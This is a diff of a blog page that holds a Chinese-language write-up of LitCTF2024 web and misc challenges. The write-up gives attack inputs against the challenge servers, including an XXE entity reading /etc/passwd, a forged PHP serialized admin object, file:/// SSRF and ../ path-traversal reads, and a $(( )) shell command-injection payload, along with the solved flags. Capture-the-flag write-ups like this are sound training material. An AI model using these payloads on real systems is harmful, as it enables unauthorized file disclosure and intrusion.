@@ -14,8 +14,8 @@
 <meta property="og:description" content="LitCTF2024 WriteUp">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://w0r1d-pr1nt.github.io/images/zhaopian/lit/ssti.png">
-<meta property="og:image" content="http://w0r1d-pr1nt.github.io/images/zhaopian/lit/a.png">
-<meta property="og:image" content="http://w0r1d-pr1nt.github.io/images/zhaopian/lit/bengtie.jpg">
+<meta property="og:image" content="http://w0r1d-pr1nt.github.io/2024/06/01/LitCTF/images/zhaopian/lit/a.png">
+<meta property="og:image" content="http://w0r1d-pr1nt.github.io/2024/06/01/LitCTF/images/zhaopian/lit/bengtie.jpg">
 <meta property="article:published_time" content="2024-05-31T16:00:00.000Z">
 <meta property="article:modified_time" content="2024-06-01T11:20:48.853Z">
 <meta property="article:author" content="Pr1nt">
@@ -28,15 +28,15 @@
 <link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
 
 
-<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1723545465058">
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1723795549813">
 
-<link rel="stylesheet" href="/css/style.css?v=1723545465058">
+<link rel="stylesheet" href="/css/style.css?v=1723795549813">
 
 
 
 
     
-        <link rel="stylesheet" href="/custom.css?v=1723545465058">
+        <link rel="stylesheet" href="/custom.css?v=1723795549813">
     
 
 
@@ -46,7 +46,7 @@
 <script src="/lib/lax.min.js" async></script>
 
 
-<script async src="/js/app.js?v=1723545465058"></script>
+<script async src="/js/app.js?v=1723795549814"></script>
 
  
 
@@ -122,7 +122,7 @@
 </div>
 
 
-	<script async src="/js/search.js?v=1723545465058"></script>
+	<script async src="/js/search.js?v=1723795549814"></script>
 
 
 
@@ -290,20 +290,23 @@
     
 </div>
 
-    <h1 id="LitCTF2024-WriteUp"><a href="#LitCTF2024-WriteUp" class="headerlink" title="LitCTF2024 WriteUp"></a>LitCTF2024 WriteUp</h1><span id="more"></span>
-
+    <h1>LitCTF2024 WriteUp</h1>
+<span id="more"></span>
 <ol>
-<li><a href="#litctf2024-writeup">LitCTF2024 WriteUp</a><ol>
-<li><a href="#web">Web</a><ol>
+<li><a href="#litctf2024-writeup">LitCTF2024 WriteUp</a>
+<ol>
+<li><a href="#web">Web</a>
+<ol>
 <li><a href="#exx">exx</a></li>
-<li><a href="#%E4%B8%80%E4%B8%AA%E6%B1%A0%E5%AD%90">一个….池子？</a></li>
+<li><a href="#%E4%B8%80%E4%B8%AA%E6%B1%A0%E5%AD%90">一个…池子？</a></li>
 <li><a href="#sas---serializing-authentication-system">SAS - Serializing Authentication System</a></li>
 <li><a href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B9%9F%E8%83%BD%E5%A5%97%E5%A8%83">浏览器也能套娃？</a></li>
 <li><a href="#%E9%AB%98%E4%BA%AE%E4%B8%BB%E9%A2%98%E5%88%92%E6%8E%89%E8%83%8C%E6%99%AF%E6%9F%A5%E7%9C%8B%E5%99%A8">高亮主题(划掉)背景查看器</a></li>
 <li><a href="#%E7%99%BE%E4%B8%87%E7%BE%8E%E5%85%83%E7%9A%84%E8%AF%B1%E6%83%91">百万美元的诱惑</a></li>
 </ol>
 </li>
-<li><a href="#misc">Misc</a><ol>
+<li><a href="#misc">Misc</a>
+<ol>
 <li><a href="#%E6%B6%90%E8%B4%AA%E6%81%8B%E5%92%8C%E4%BC%B1%E7%94%BEd%C3%A9%E6%AF%8E%E5%85%AE%E6%AF%8E%E7%A7%92">涐贪恋和伱、甾―⑺dé毎兮毎秒</a></li>
 <li><a href="#%E4%BD%A0%E8%AF%B4%E5%BE%97%E5%AF%B9%E4%BD%86__">你说得对，但__</a></li>
 <li><a href="#%E5%8E%9F%E9%93%81%E5%90%AF%E5%8A%A8">原铁，启动！</a></li>
@@ -314,39 +317,69 @@
 </ol>
 </li>
 </ol>
-<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><blockquote>
+<h2 id="Web">Web</h2>
+<blockquote>
 <p>ak是61最好的礼物，去年才解出五个200多解的签到题，今年已经能ak了</p>
 </blockquote>
-<h3 id="exx"><a href="#exx" class="headerlink" title="exx"></a>exx</h3><p>根据题目名字一眼xxe,随便admin&#x2F;123456抓包看到<code>&lt;username&gt;admin&lt;/username&gt;</code>确定了,然后本来xxe不会的,直接上网现学<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44420143/article/details/118721145?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171723381716800178531352%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=171723381716800178531352&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-6-118721145-null-null.142%5Ev100%5Econtrol&utm_term=xxe">(csdn)XXE知识总结，有这篇就够了！</a><br>然后随便拿个poc</p>
+<h3 id="exx">exx</h3>
+<p>根据题目名字一眼xxe,随便admin/123456抓包看到<code>&lt;username&gt;admin&lt;/username&gt;</code>确定了,然后本来xxe不会的,直接上网现学<br>
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44420143/article/details/118721145?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171723381716800178531352%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=171723381716800178531352&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-6-118721145-null-null.142%5Ev100%5Econtrol&amp;utm_term=xxe">(csdn)XXE知识总结，有这篇就够了！</a><br>
+然后随便拿个poc</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">xxe</span> [<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">name</span> <span class="hljs-keyword">ANY</span> &gt;</span><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br><br>里面name改username,file:///etc改file:///flag,直接就出了<br></code></pre></td></tr></table></figure>
 <p>flag:<code>NSSCTF&#123;2ca880f2-6e91-4715-a5a7-f6cecdc2f325&#125;</code></p>
-<h3 id="一个…-池子？"><a href="#一个…-池子？" class="headerlink" title="一个….池子？"></a>一个….池子？</h3><p>输入4显示4一眼ssti，然后fenjing秒了<br><a target="_blank" rel="noopener" href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a></p>
-<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/lit/ssti.png" alt="result" data-caption="result" loading="lazy">   </p>
+<h3 id="一个…池子？">一个…池子？</h3>
+<p>输入4显示4一眼ssti，然后fenjing秒了<br>
+<a target="_blank" rel="noopener" href="https://github.com/Marven11/Fenjing">https://github.com/Marven11/Fenjing</a></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/lit/ssti.png" alt="result" data-caption="result" loading="lazy"></p>
 <p>flag:<code>NSSCTF&#123;6f25df6b-2968-481d-bcf7-8b85709b8e66&#125;</code></p>
-<h3 id="SAS-Serializing-Authentication-System"><a href="#SAS-Serializing-Authentication-System" class="headerlink" title="SAS - Serializing Authentication System"></a>SAS - Serializing Authentication System</h3><blockquote>
+<h3 id="SAS-Serializing-Authentication-System">SAS - Serializing Authentication System</h3>
+<blockquote>
 <p>ez反序列化</p>
 </blockquote>
 <p>本地序列化new的时候赋个值就可以了</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValid</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;password === <span class="hljs-string">&#x27;secure_password&#x27;</span>; &#125;<br><br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;secure_password&#x27;</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
-<p>然后base64一下扔进去就行了<br>flag:<code>flag&#123;deserialization_vulnerability&#125;</code></p>
-<h3 id="浏览器也能套娃？"><a href="#浏览器也能套娃？" class="headerlink" title="浏览器也能套娃？"></a>浏览器也能套娃？</h3><p>感觉是真签到,为什么才161解,没看懂题型,是ssrf?<br>payload:<code>file:///flag</code><br>flag:<code>NSSCTF&#123;f41d90e7-9261-4cbf-a58e-8d7cfef2468d&#125;</code></p>
-<h3 id="高亮主题-划掉-背景查看器"><a href="#高亮主题-划掉-背景查看器" class="headerlink" title="高亮主题(划掉)背景查看器"></a>高亮主题(划掉)背景查看器</h3><p>?url&#x3D;a,没反应,代码里应该是有反应的,所以不对,抓包看看POST了theme&#x3D;theme1.php,访问一下报404,看来是相对路径包含的theme1.php,然后<code>./flag ./flag.php </code>一个个测,最终是<code>../../../../flag</code><br>flag:<code>NSSCTF&#123;2d8dae27-f508-4921-b4a9-54b7197d2949&#125;</code></p>
-<h3 id="百万美元的诱惑"><a href="#百万美元的诱惑" class="headerlink" title="百万美元的诱惑"></a>百万美元的诱惑</h3><blockquote>
+<p>然后base64一下扔进去就行了<br>
+flag:<code>flag&#123;deserialization_vulnerability&#125;</code></p>
+<h3 id="浏览器也能套娃？">浏览器也能套娃？</h3>
+<p>感觉是真签到,为什么才161解,没看懂题型,是ssrf?<br>
+payload:<code>file:///flag</code><br>
+flag:<code>NSSCTF&#123;f41d90e7-9261-4cbf-a58e-8d7cfef2468d&#125;</code></p>
+<h3 id="高亮主题-划掉-背景查看器">高亮主题(划掉)背景查看器</h3>
+<p>?url=a,没反应,代码里应该是有反应的,所以不对,抓包看看POST了theme=theme1.php,访问一下报404,看来是相对路径包含的theme1.php,然后<code>./flag ./flag.php </code>一个个测,最终是<code>../../../../flag</code><br>
+flag:<code>NSSCTF&#123;2d8dae27-f508-4921-b4a9-54b7197d2949&#125;</code></p>
+<h3 id="百万美元的诱惑">百万美元的诱惑</h3>
+<blockquote>
 <p>这题本来能一血的但是九点在学校只有手机没有电脑命令构造对了没有f12看不到真烦死了</p>
 </blockquote>
-<p>第一层闭着眼睛做<code>?a[]=1&amp;b[]=1&amp;c=2025e</code>,出<code>./dollar.php</code><br>第二层用点脑子做,题目来源ctfshow,web57,一模一样的36变12而已,原理是<code>$(())</code>在linuxshell中为0,自己echo一下就知道了,然后一点点运算,构造出12<br>payload:<code>?x=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</code></p>
+<p>第一层闭着眼睛做<code>?a[]=1&amp;b[]=1&amp;c=2025e</code>,出<code>./dollar.php</code><br>
+第二层用点脑子做,题目来源ctfshow,web57,一模一样的36变12而已,原理是<code>$(())</code>在linuxshell中为0,自己echo一下就知道了,然后一点点运算,构造出12<br>
+payload:<code>?x=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</code></p>
 <p>然后f12一下看</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;LitCTF&#123;dollar_d0llar_d0ll@r!!!&#125;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
-
-<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="涐贪恋和伱、甾―⑺de毎兮毎秒"><a href="#涐贪恋和伱、甾―⑺de毎兮毎秒" class="headerlink" title="涐贪恋和伱、甾―⑺dé毎兮毎秒"></a>涐贪恋和伱、甾―⑺dé毎兮毎秒</h3><p>刚打开不知所云,然后扔进随波逐流直接就出了<br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/lit/a.png" alt="1" data-caption="1" loading="lazy"><br>flag:<code>LitCTF&#123;e8f7b267-9c45-4c0e-9d1e-13fc5bcb9bd6&#125;</code></p>
-<h3 id="你说得对，但"><a href="#你说得对，但" class="headerlink" title="你说得对，但__"></a>你说得对，但__</h3><p>一打开就是个二维码,扫一下是云原神(神金,给爷逗乐了)<br>扔进随波逐流自动识别带zip  </p>
+<h2 id="Misc">Misc</h2>
+<h3 id="涐贪恋和伱、甾―⑺de毎兮毎秒">涐贪恋和伱、甾―⑺dé毎兮毎秒</h3>
+<p>刚打开不知所云,然后扔进随波逐流直接就出了<br>
+<img onerror="imgOnError(this);" data-fancybox="gallery" src="images/zhaopian/lit/a.png" alt="1" data-caption="1" loading="lazy"><br>
+flag:<code>LitCTF&#123;e8f7b267-9c45-4c0e-9d1e-13fc5bcb9bd6&#125;</code></p>
+<h3 id="你说得对，但">你说得对，但__</h3>
+<p>一打开就是个二维码,扫一下是云原神(神金,给爷逗乐了)<br>
+扔进随波逐流自动识别带zip</p>
 <blockquote>
 <p>为什么不是传统binwalk stegsolve挨个试是因为随波逐流比较自动化,不用puzzlesolver是因为20没买涨到50更不想买了,反正我是web手</p>
 </blockquote>
-<p>然后binwalk分解一下出来四个四分之一二维码,扔进ps随便扫一下就好了(不复现了太麻烦了,ps文件没保存,四个四分之一二维码也直接删了懒得重搞了)<br>flag:<code>LitCTF&#123;Genshin_St@rt!!&#125;</code></p>
-<h3 id="原铁，启动！"><a href="#原铁，启动！" class="headerlink" title="原铁，启动！"></a>原铁，启动！</h3><p>调转手机可以勉强看出<code>flag&#123;good_</code>,后面带黑框的就不明白了,然后原铁,原神和崩铁,就看了一下这俩游戏的文字,原神的反正也看出来了没管直接搜崩铁的了<br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/zhaopian/lit/bengtie.jpg" alt="1" data-caption="1" loading="lazy"><br>flag:<code>flag&#123;good_gamer&#125;</code></p>
-<h3 id="盯帧珍珠"><a href="#盯帧珍珠" class="headerlink" title="盯帧珍珠"></a>盯帧珍珠</h3><p>还是随波逐流,提示gif被改了,于是修改为gif,然后就是动图,里面插着几帧flag,目押出<br>flag:<code>LitCTF&#123;You_are_really_staring_at_frames!&#125;</code><br>(其实我是放stegsolve里一帧一帧看的)</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>连做带写wp总共2个小时,misc只做4个是因为后面的懒得做了,要出去玩了<br>一开始九点钟一上线看到16个密码2个re,没web没pwn看傻眼了,然后群里说环境一会上,就等了一会先上的exx,然后第二个上的百万美元,exx瞬间就一血了,我看了一眼手机做不了就没管直接看的美元, 然后瞬间秒第一层,第二层一眼原题,直接去找ctfshow里的答案然后执行了,执行完发现,我手机没有f12看不到html注释,眼睁睁看着一血消失,真服了<br>2023年刚入门打lit,然后狠狠的知道什么叫废物,现在变老登狠狠拷打新生了(x),但是我都ak了怎么才300多名(还是密码出太多了)</p>
+<p>然后binwalk分解一下出来四个四分之一二维码,扔进ps随便扫一下就好了(不复现了太麻烦了,ps文件没保存,四个四分之一二维码也直接删了懒得重搞了)<br>
+flag:<code>LitCTF&#123;Genshin_St@rt!!&#125;</code></p>
+<h3 id="原铁，启动！">原铁，启动！</h3>
+<p>调转手机可以勉强看出<code>flag&#123;good_</code>,后面带黑框的就不明白了,然后原铁,原神和崩铁,就看了一下这俩游戏的文字,原神的反正也看出来了没管直接搜崩铁的了<br>
+<img onerror="imgOnError(this);" data-fancybox="gallery" src="images/zhaopian/lit/bengtie.jpg" alt="1" data-caption="1" loading="lazy"><br>
+flag:<code>flag&#123;good_gamer&#125;</code></p>
+<h3 id="盯帧珍珠">盯帧珍珠</h3>
+<p>还是随波逐流,提示gif被改了,于是修改为gif,然后就是动图,里面插着几帧flag,目押出<br>
+flag:<code>LitCTF&#123;You_are_really_staring_at_frames!&#125;</code><br>
+(其实我是放stegsolve里一帧一帧看的)</p>
+<h2 id="总结">总结</h2>
+<p>连做带写wp总共2个小时,misc只做4个是因为后面的懒得做了,要出去玩了一开始九点钟一上线看到16个密码2个re,没web没pwn看傻眼了,然后群里说环境一会上,就等了一会先上的exx,然后第二个上的百万美元,exx瞬间就一血了,我看了一眼手机做不了就没管直接看的美元, 然后瞬间秒第一层,第二层一眼原题,直接去找ctfshow里的答案然后执行了,执行完发现,我手机没有f12看不到html注释,眼睁睁看着一血消失,真服了<br>
+2023年刚入门打lit,然后狠狠的知道什么叫废物,现在变老登狠狠拷打新生了(x),但是我都ak了怎么才300多名(还是密码出太多了)</p>
 <p>很有趣的新生赛,第一次体会到ak的感觉,考点也挺全的</p>
 
     
@@ -365,7 +398,7 @@
 </div>
   
   
-    <script async src="/js/copy-codeblock.js?v=1723545464893"></script>
+    <script async src="/js/copy-codeblock.js?v=1723795549649"></script>
   
 
   
@@ -398,7 +431,7 @@
             <button class="mdui-fab catalog" style="overflow:unset;">
                 <i class="nexmoefont icon-i-catalog"></i>
                 <div class="nexmoe-toc">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#LitCTF2024-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">LitCTF2024 WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exx"><span class="toc-number">1.1.1.</span> <span class="toc-text">exx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E2%80%A6-%E6%B1%A0%E5%AD%90%EF%BC%9F"><span class="toc-number">1.1.2.</span> <span class="toc-text">一个….池子？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SAS-Serializing-Authentication-System"><span class="toc-number">1.1.3.</span> <span class="toc-text">SAS - Serializing Authentication System</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B9%9F%E8%83%BD%E5%A5%97%E5%A8%83%EF%BC%9F"><span class="toc-number">1.1.4.</span> <span class="toc-text">浏览器也能套娃？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E4%BA%AE%E4%B8%BB%E9%A2%98-%E5%88%92%E6%8E%89-%E8%83%8C%E6%99%AF%E6%9F%A5%E7%9C%8B%E5%99%A8"><span class="toc-number">1.1.5.</span> <span class="toc-text">高亮主题(划掉)背景查看器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BE%E4%B8%87%E7%BE%8E%E5%85%83%E7%9A%84%E8%AF%B1%E6%83%91"><span class="toc-number">1.1.6.</span> <span class="toc-text">百万美元的诱惑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B6%90%E8%B4%AA%E6%81%8B%E5%92%8C%E4%BC%B1%E3%80%81%E7%94%BE%E2%80%95%E2%91%BAde%E6%AF%8E%E5%85%AE%E6%AF%8E%E7%A7%92"><span class="toc-number">1.2.1.</span> <span class="toc-text">涐贪恋和伱、甾―⑺dé毎兮毎秒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E8%AF%B4%E5%BE%97%E5%AF%B9%EF%BC%8C%E4%BD%86"><span class="toc-number">1.2.2.</span> <span class="toc-text">你说得对，但__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E9%93%81%EF%BC%8C%E5%90%AF%E5%8A%A8%EF%BC%81"><span class="toc-number">1.2.3.</span> <span class="toc-text">原铁，启动！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AF%E5%B8%A7%E7%8F%8D%E7%8F%A0"><span class="toc-number">1.2.4.</span> <span class="toc-text">盯帧珍珠</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">LitCTF2024 WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exx"><span class="toc-number">1.1.1.</span> <span class="toc-text">exx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E2%80%A6%E6%B1%A0%E5%AD%90%EF%BC%9F"><span class="toc-number">1.1.2.</span> <span class="toc-text">一个…池子？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SAS-Serializing-Authentication-System"><span class="toc-number">1.1.3.</span> <span class="toc-text">SAS - Serializing Authentication System</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B9%9F%E8%83%BD%E5%A5%97%E5%A8%83%EF%BC%9F"><span class="toc-number">1.1.4.</span> <span class="toc-text">浏览器也能套娃？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E4%BA%AE%E4%B8%BB%E9%A2%98-%E5%88%92%E6%8E%89-%E8%83%8C%E6%99%AF%E6%9F%A5%E7%9C%8B%E5%99%A8"><span class="toc-number">1.1.5.</span> <span class="toc-text">高亮主题(划掉)背景查看器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BE%E4%B8%87%E7%BE%8E%E5%85%83%E7%9A%84%E8%AF%B1%E6%83%91"><span class="toc-number">1.1.6.</span> <span class="toc-text">百万美元的诱惑</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">1.2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B6%90%E8%B4%AA%E6%81%8B%E5%92%8C%E4%BC%B1%E3%80%81%E7%94%BE%E2%80%95%E2%91%BAde%E6%AF%8E%E5%85%AE%E6%AF%8E%E7%A7%92"><span class="toc-number">1.2.1.</span> <span class="toc-text">涐贪恋和伱、甾―⑺dé毎兮毎秒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%A0%E8%AF%B4%E5%BE%97%E5%AF%B9%EF%BC%8C%E4%BD%86"><span class="toc-number">1.2.2.</span> <span class="toc-text">你说得对，但__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E9%93%81%EF%BC%8C%E5%90%AF%E5%8A%A8%EF%BC%81"><span class="toc-number">1.2.3.</span> <span class="toc-text">原铁，启动！</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AF%E5%B8%A7%E7%8F%8D%E7%8F%A0"><span class="toc-number">1.2.4.</span> <span class="toc-text">盯帧珍珠</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
                 </div>
             </button>
             
